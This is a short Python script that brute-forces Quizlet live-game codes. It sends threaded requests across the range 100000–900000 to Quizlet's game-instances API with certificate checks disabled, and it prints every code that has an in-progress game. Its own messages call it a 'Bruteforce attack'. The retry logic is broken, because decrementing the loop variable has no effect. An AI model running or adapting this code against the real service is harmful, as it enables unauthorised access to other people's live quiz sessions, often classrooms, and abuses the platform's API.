import requests
import sys
import _thread as thread
requests.packages.urllib3.disable_warnings()
class colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def run(start,end):
	for i in range(start,end):
		try:
			endpoint = "https://quizlet.com/webapi/3.2/game-instances?filters={\"gameCode\":\""+str(i)+"\",\"isInProgress\":\"true\",\"isDeleted\":\"false\"}"
			test=requests.get(endpoint,verify=False)
			if("\"total\":0" not in test.text):
				print(colors.OKGREEN,"[+]Found:",i,colors.ENDC)
		except:
				print(colors.WARNING,"[!]Connection error, retrying...",colors.ENDC)
				i-=2
	print(colors.OKBLUE,"[i]Bruteforce attack thread finished.",colors.ENDC)
for x in range(100000,900000,100000):
	thread.start_new_thread(run, (x,x+100000 ) )
print(colors.HEADER,"[i]Bruteforce attack started, this will take some time.",colors.ENDC)
while(1):
	try:
		pass
	except KeyboardInterrupt:
		print(colors.FAIL,"[x]Attack aborted",colors.ENDC)
		sys.exit()